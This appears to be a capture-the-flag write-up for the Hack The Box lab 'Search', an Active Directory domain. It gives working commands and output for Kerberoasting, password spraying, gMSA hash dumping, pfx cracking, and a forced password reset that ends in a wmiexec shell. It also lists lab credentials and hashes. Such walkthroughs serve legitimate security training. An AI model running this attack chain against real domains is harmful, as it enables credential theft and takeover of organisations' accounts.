## Object

### Lab Details 

- Difficulty: Hard
- Type: OSINT, pfx certificate, Web Shell, AD, Windows

#### Enumeration
- run `nmap`
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &mdash; Just Testing IIS
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-30 12:48:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-30T12:50:03+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2025-10-30T12:50:03+00:00; 0s from scanner time.
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_http-title: Search &mdash; Just Testing IIS
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2025-10-30T12:50:03+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-30T12:50:03+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2025-10-30T12:50:03+00:00; 0s from scanner time.
8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2025-10-30T12:50:03+00:00; 0s from scanner time.
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Not valid before: 2020-04-07T09:05:25
|_Not valid after:  2030-04-05T09:05:25
|_http-title: Site doesn't have a title.
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49744/tcp open  msrpc         Microsoft Windows RPC
```
- enumerate the application found a list of users 
```
Keely Lyons
Dax Santiago
Sierra Frye
Kyla Stewart
Kaiara Spencer
Dave Simpson
Ben Thompson
Chris Stewart
```
- convert into `AD` naming conventions 
```bash
keelylyons
keely-lyons
keely.lyons
keelyo
kee-lyo
kee.lyo
klyons
k-lyons
k.lyons
lyonskeely
lyons-keely
lyons.keely
lyokee
lyo-kee
lyo.kee
lkeely
l-keely
l.keely
lyonsk
lyons-k
lyons.k
daxisantiago
dax-isantiago
dax.isantiago
daxisa
dax-isa
dax.isa
disantiago
d-isantiago
d.isantiago
isantiagodax
isantiago-dax
isantiago.dax
isadax
isa-dax
isa.dax
idax
i-dax
i.dax
isantiagod
isantiago-d
isantiago.d
sierrafrye
sierra-frye
sierra.frye
siefry
sie-fry
sie.fry
sfrye
s-frye
s.frye
fryesierra
frye-sierra
frye.sierra
frysie
fry-sie
fry.sie
fsierra
f-sierra
f.sierra
fryes
frye-s
frye.s
kylastewart
kyla-stewart
kyla.stewart
kylste
kyl-ste
kyl.ste
kstewart
k-stewart
k.stewart
stewartkyla
stewart-kyla
stewart.kyla
stekyl
ste-kyl
ste.kyl
skyla
s-kyla
s.kyla
stewartk
stewart-k
stewart.k
kaiaraspencer
kaiara-spencer
kaiara.spencer
kaispe
kai-spe
kai.spe
kspencer
k-spencer
k.spencer
spencerkaiara
spencer-kaiara
spencer.kaiara
spekai
spe-kai
spe.kai
skaiara
s-kaiara
s.kaiara
spencerk
spencer-k
spencer.k
davesimpson
dave-simpson
dave.simpson
davsim
dav-sim
dav.sim
dsimpson
d-simpson
d.simpson
simpsondave
simpson-dave
simpson.dave
simdav
sim-dav
sim.dav
sdave
s-dave
s.dave
simpsond
simpson-d
simpson.d
benthompson
ben-thompson
ben.thompson
bentho
ben-tho
ben.tho
bthompson
b-thompson
b.thompson
thompsonben
thompson-ben
thompson.ben
thoben
tho-ben
tho.ben
tben
t-ben
t.ben
thompsonb
thompson-b
thompson.b
chrisstewart
chris-stewart
chris.stewart
chrste
chr-ste
chr.ste
cstewart
c-stewart
c.stewart
stewartchris
stewart-chris
stewart.chris
stechr
ste-chr
ste.chr
schris
s-chris
s.chris
stewartc
stewart-c
stewart.c
```
- enumerate for usernames using `kerbrute` , found two valid usernames
```bash
$ ./kerbrute userenum --dc 10.129.229.57 -d search.htb ad_users.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/30/25 - Ronnie Flathers @ropnop

2025/10/30 08:31:28 >  Using KDC(s):
2025/10/30 08:31:28 >  	10.129.229.57:88

2025/10/30 08:31:28 >  [+] VALID USERNAME:	 keely.lyons@search.htb
2025/10/30 08:31:28 >  [+] VALID USERNAME:	 sierra.frye@search.htb
2025/10/30 08:31:28 >  Done! Tested 168 usernames (2 valid) in 0.051 seconds
```
 - run `ffuf` to fuzzing files against port 80 and 443, both are hosting the same application from the scan output
```bash
$ ffuf -u https://search.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://search.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

js                      [Status: 301, Size: 145, Words: 9, Lines: 2, Duration: 25ms]
css                     [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 24ms]
images                  [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 14ms]
Images                  [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 10ms]
fonts                   [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 14ms]
.                       [Status: 200, Size: 44982, Words: 13260, Lines: 1030, Duration: 14ms]
staff                   [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 41ms]
CSS                     [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 6ms]
JS                      [Status: 301, Size: 145, Words: 9, Lines: 2, Duration: 7ms]
Css                     [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 5ms]
Js                      [Status: 301, Size: 145, Words: 9, Lines: 2, Duration: 7ms]
IMAGES                  [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 13ms]
Fonts                   [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 8ms]
Staff                   [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 44ms]
certsrv                 [Status: 401, Size: 1293, Words: 81, Lines: 30, Duration: 7ms]
STAFF                   [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 25ms]
FONTS                   [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 30ms]
jS                      [Status: 301, Size: 145, Words: 9, Lines: 2, Duration: 9ms]
```
- found login on `http://search.htb/certsrv` - check if certificates are misconfigured 
- no subdomains found using `ffuf` or `gobuster`, however found in `nmap` output for port 443 in the `commonName` field
```bash
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2025-10-30T12:50:03+00:00; 0s from scanner time.
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_http-title: Search &mdash; Just Testing IIS
| tls-alpn: 
|_  http/1.1
```
port 445
- no anonymous access to `smb` 
- enumerate web app against and found a image contains some data
![[password in image.png]]
- `Send password to Hope Sharp` and the next line `IsolationIsKey?`
- we get a valid credential for `hope.sharp`
```bash
$ nxc smb  10.129.229.57 -u hope.sharp -p 'IsolationIsKey?'
SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.57   445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey?
```
- enumerate further with the credential 
```bash
$ nxc smb  10.129.229.57 -u hope.sharp -p 'IsolationIsKey?' --shares
SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.57   445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
SMB         10.129.229.57   445    RESEARCH         [*] Enumerated shares
SMB         10.129.229.57   445    RESEARCH         Share           Permissions     Remark
SMB         10.129.229.57   445    RESEARCH         -----           -----------     ------
SMB         10.129.229.57   445    RESEARCH         ADMIN$                          Remote Admin
SMB         10.129.229.57   445    RESEARCH         C$                              Default share
SMB         10.129.229.57   445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
SMB         10.129.229.57   445    RESEARCH         helpdesk                        
SMB         10.129.229.57   445    RESEARCH         IPC$            READ            Remote IPC
SMB         10.129.229.57   445    RESEARCH         NETLOGON        READ            Logon server share 
SMB         10.129.229.57   445    RESEARCH         RedirectedFolders$ READ,WRITE      
SMB         10.129.229.57   445    RESEARCH         SYSVOL          READ            Logon server share 
```
- we have read and write access to `RedirectedFolders$`, we also have read access to `CertEnroll`
```bash
$ smbclient //10.129.229.57/CertEnroll -U hope.sharp
Password for [WORKGROUP\hope.sharp]:
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \nsrev_search-RESEARCH-CA.asp of size 330 as nsrev_search-RESEARCH-CA.asp (11.5 KiloBytes/sec) (average 11.5 KiloBytes/sec)
getting file \Research.search.htb_search-RESEARCH-CA.crt of size 883 as Research.search.htb_search-RESEARCH-CA.crt (143.7 KiloBytes/sec) (average 34.8 KiloBytes/sec)
getting file \search-RESEARCH-CA+.crl of size 735 as search-RESEARCH-CA+.crl (119.6 KiloBytes/sec) (average 47.6 KiloBytes/sec)
getting file \search-RESEARCH-CA.crl of size 931 as search-RESEARCH-CA.crl (151.5 KiloBytes/sec) (average 61.1 KiloBytes/sec)
```
- get the all contents in `RedirectedFolders$`
```bash
$ smbclient //10.129.229.57/RedirectedFolders$ -U hope.sharp
Password for [WORKGROUP\hope.sharp]:
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
NT_STATUS_ACCESS_DENIED opening remote file \sierra.frye\user.txt
<SNIP>
```
- we can attempt to get `krb tgs` hash using `GetUserSPNs`
- found `tgs` hash for user `web_svc`
```bash
$ GetUserSPNs.py -request -dc-ip 10.129.229.57 search.htb/hope.sharp:IsolationIsKey?
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
---------------------------------  -------  --------  --------------------------  ---------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 07:59:11.329031  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$09722f9a4e30f9c5c8fb7810797d162f$81208274df8b45d522e291fad6b25d0a2d3d75feb63f01a3ce8d9867c1ec84713bedab7c36e7c84f6dc6647170f5edc081ffb0c5a8f70f568368d8a467284a4f19a<SNIP>
```
- decrypt it using `hashcat`, we get the password 
```bash
web_svc : @3ONEmillionbaby
```
#### Initial Foothold 
- run `bloodhound-python` against the target, load data to `bloodhound`
- checking `web_svc` user info on bloodhound in the description section its stated that the account is temp account created by `help desk`
![[web_svc bloodhound.png]]
- check the help desk group
![[helpdesk group bloodhound.png]]
- we have a list of users 
![[BIR-ADFS-GMSA bloodhound.png]]
- and we see `BIR-ADFS-GMSA$` machine account has `GenericAll` access to `tristan.davies`
- save the users in the `help desk` group to a list 
``` 
Tristan.Daves 
Chanel.Bell
Lane.Wu
Keith.Hester
Isabela.Estrada
Edgar.Jacobs
```
- perform a password spray with `web_svc` password against new found users from help desk
```bash
$ for u in Tristan.Daves Isabela.Estrada Keith.Hester Chanel.Bell Edgar.Jacobs Lane.Wu; do echo "checking smb access for:" $u && smbmap -u $u -p '@3ONEmillionbaby' -d search -H 10.129.229.57; done
checking smb access for: Tristan.Daves
[!] Authentication error on 10.129.229.57
checking smb access for: Isabela.Estrada
[!] Authentication error on 10.129.229.57
checking smb access for: Keith.Hester
[!] Authentication error on 10.129.229.57
checking smb access for: Chanel.Bell
[!] Authentication error on 10.129.229.57
checking smb access for: Edgar.Jacobs
[+] IP: 10.129.229.57:445	Name: 10.129.229.57                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	RedirectedFolders$                                	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share 
checking smb access for: Lane.Wu
[!] Authentication error on 10.129.229.57
```
- we get valid credential for `smb` as `Edgar.Jacobs`
```bash
$ smbclient //10.129.229.57/RedirectedFolders$ -U Edgar.Jacobs
Password for [WORKGROUP\Edgar.Jacobs]:
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```
- get everything in `redirectefolders$`
```bash
<SNIP>
├── edgar.jacobs
│   ├── Desktop
│   │   ├── $RECYCLE.BIN
│   │   │   └── desktop.ini
│   │   ├── desktop.ini
│   │   ├── Microsoft Edge.lnk
│   │   └── Phishing_Attempt.xlsx
<SNIP>
```
- we see there is a `xslx` file 
![[phishing attempt xlsx.png]]
- the `C column` seems to be hidden, when coping the user across to a text file we get passwords 
```bash
firstname	lastname	password	Username
Payton	Harmon	;;36!cried!INDIA!year!50;;	Payton.Harmon
Cortez	Hickman	..10-time-TALK-proud-66..	Cortez.Hickman
Bobby	Wolf	??47^before^WORLD^surprise^91??	Bobby.Wolf
Margaret	Robinson	//51+mountain+DEAR+noise+83//	Margaret.Robinson
Scarlett	Parks	++47|building|WARSAW|gave|60++	Scarlett.Parks
Eliezer	Jordan	!!05_goes_SEVEN_offer_83!!	Eliezer.Jordan
Hunter	Kirby	~~27%when%VILLAGE%full%00~~	Hunter.Kirby
Sierra	Frye	$$49=wide=STRAIGHT=jordan=28$$18	Sierra.Frye
Annabelle	Wells	==95~pass~QUIET~austria~77==	Annabelle.Wells
Eve	Galvan	//61!banker!FANCY!measure!25//	Eve.Galvan
Jeramiah	Fritz	??40:student:MAYOR:been:66??	Jeramiah.Fritz
Abby	Gonzalez	&&75:major:RADIO:state:93&&	Abby.Gonzalez
Joy	Costa	**30*venus*BALL*office*42**	Joy.Costa
Vincent	Sutton	**24&moment&BRAZIL&members&66**	Vincent.Sutton
```
- however we are unable to expand it in the sheet itself, we can copy the data and create a new sheet and paste in the data
![[password new sheet.png]]
- perform a password spray and we found a valid credential as user `Sierra.Frye`
```bash
$ nxc smb 10.129.229.57 -u users.txt -p passwords.txt --continue-on-success
<SNIP>
SMB         10.129.229.57   445    RESEARCH         [+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18 
<SNIP>
```
#### Lateral Movement (If any)

#### Privilege Escalation
- with the credential of `Sierra.Frye` we can get `Enterprise Admins/Domain Admins/Administrators` access by first compromising `BIR-ADFS-GMSA` computer account then `Tristan.Davies` user account
![[sierra.frye root path bloodhound.png]]

```bash
$ python3 gMSADumper/gMSADumper.py -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' -d search.htb -l 10.129.229.57
Users or groups who can read password for BIR-ADFS-GMSA$:
 > ITSec
BIR-ADFS-GMSA$:::e1e9fd9e46d0d747e1595167eedcec0f
BIR-ADFS-GMSA$:aes256-cts-hmac-sha1-96:06e03fa99d7a99ee1e58d795dccc7065a08fe7629441e57ce463be2bc51acf38
BIR-ADFS-GMSA$:aes128-cts-hmac-sha1-96:dc4a4346f54c0df29313ff8a21151a42
```
- attempt with getting `tristan.davies` password hash however unable to crack it using `hashcat`
- perform additional enumeration as `Sierra.Frye` in `smb` 
- found certificate files 
```bash
smb: \sierra.frye\Downloads\Backups\> ls
  .                                 DHc        0  Mon Aug 10 15:39:17 2020
  ..                                DHc        0  Mon Aug 10 15:39:17 2020
  search-RESEARCH-CA.p12             Ac     2643  Fri Jul 31 10:04:11 2020
  staff.pfx                          Ac     4326  Mon Aug 10 15:39:17 2020
```
- attempt to crack the `pfx` file with john
```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt staff.hash
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
misspissy        (staff.pfx) 
$ pfx2john staff.pfx > staff.hash
```
- we get the plain text  password 
- attempt to add the certificates to firefox
![[import certs.png]]
- visit `/staff` endpoint via `HTTPS`
- will prompt us to use the certificate of `Sierra.Frye`
- proceed through we will see a login for `Powershell web access`
![[weshell on staff endpoint.png]]
- login with `Sierra.Frye`'s credential to the `research` computer
![[web powershell.png]]
- we can attempt to fetch the `GMSAPassword` of the `BIR-ADFS-GMSA` machine account following [this post](https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/)
- however the method used in this post will not result in a plaintext that we can easily use by just copy and pasting 
- we need to combine it with in this instance password reset attack against `tristan.davies` since `BIR-ADFS-GMSA` machine account has generic write access over `tristan.davies`'s account
```powershell
PS C:\Users\Sierra.Frye\Documents> 

Get-ADServiceAccount `
	-Identity 'BIR-ADFS-GMSA' `
	-Properties 'msDS-ManagedPassword'

DistinguishedName    : CN=BIR-ADFS-GMSA,CN=Managed Service Accounts,DC=search,DC=htb

Enabled              : True

msDS-ManagedPassword : {1, 0, 0, 0...}

Name                 : BIR-ADFS-GMSA

ObjectClass          : msDS-GroupManagedServiceAccount

ObjectGUID           : 48cd6c5b-56cb-407e-ac2b-7294b5a44857

SamAccountName       : BIR-ADFS-GMSA$

SID                  : S-1-5-21-271492789-1610487937-1871574529-1299

UserPrincipalName    : 

$gmsa=Get-ADServiceAccount `
	-Identity 'BIR-ADFS-GMSA' `
	-Properties 'msDS-ManagedPassword'

$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp ## going to output gibberish but we can combine it with other attack such as password reset when we have generic access to that account
## combining with password overwrite
$plaintext_mp = ConvertFrom-ADManagedPasswordBlob $mp
$user = 'BIR-ADFS-GMSA$'
$passwd = $plaintext_mp.'CurrentPassword'
$secpass = ConvertTo-SecureString $passwd -AsPlainText -Force
$cred = new-object system.management.automation.PSCredential $user,$secpass
## password reset
Invoke-Command -computername 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Password123!' -force)}-Credential $cred
```
- once the password has been reset we can attempt to login as `tristan.davies` with new password
```
$ wmiexec.py 'search/tristan.davies:Password123!@10.129.229.57'
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
search\tristan.davies
```

#### Resources

#### Lesson Learned
